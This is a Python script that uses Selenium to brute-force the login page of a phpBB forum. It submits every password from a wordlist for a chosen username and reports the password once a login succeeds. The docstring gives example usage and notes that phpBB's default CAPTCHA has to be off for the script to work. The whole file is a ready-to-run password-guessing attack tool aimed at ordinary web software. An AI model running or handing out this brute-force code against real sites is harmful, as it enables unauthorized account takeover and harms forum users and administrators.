"""
Tested with phpBB 3.3.14  https://www.phpbb.com/downloads/3.3
Normally phpBB enable CAPTCH by defalut in ACP (Spambot countermeasures)
Add :: Found password function
Usage:
    python selenium-brute.py -h
    python selenium-brute.py -t "http://localhost/phpBB3/ucp.php?mode=login&redirect=index.php" -u darklite -p password.txt
"""

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from optparse import OptionParser
import sys
import time

# Argument parser
parser = OptionParser()
parser.add_option("-t", dest="target", help="target's URL")
parser.add_option("-u", dest="user", help="username")
parser.add_option("-p", dest="pas", help="wordlist file (e.g., password.txt)")
(options, args) = parser.parse_args(sys.argv)

# Get CLI inputs
url = options.target
curuser = options.user
file = options.pas

# Read passwords from file
passwords = []
with open(file, "r") as s:
    passwords = [line.strip() for line in s if line.strip()]

# Start Chrome with Selenium 4
chrome_options = Options()
service = Service(r'chromedriver.exe')
driver = webdriver.Chrome(service=service, options=chrome_options)

# Brute force function
def loginuserpass(passw):
    driver.get(url)  # Reload login page every attempt
    time.sleep(1)

    print(f"Trying -> username: {curuser} | password: {passw}")

    try:
        username_input = driver.find_element(By.ID, "username")
        password_input = driver.find_element(By.ID, "password")
        login_button = driver.find_element(By.NAME, "login")

        username_input.clear()
        username_input.send_keys(curuser)

        password_input.clear()
        password_input.send_keys(passw)

        login_button.click()

        time.sleep(2)  # Wait for redirect or page change

        current_url = driver.current_url
        print("Redirected to:", current_url)

        # ✅ Check if login was successful
        if "ucp.php?mode=login" not in current_url:
            print("✅ Login successful!")
            print(f"🔑 Password found: {passw}")
            return True

    except Exception as e:
        print("❌ Error:", e)

    return False

# Try all passwords
for pw in passwords:
    success = loginuserpass(pw)
    if success:
        break
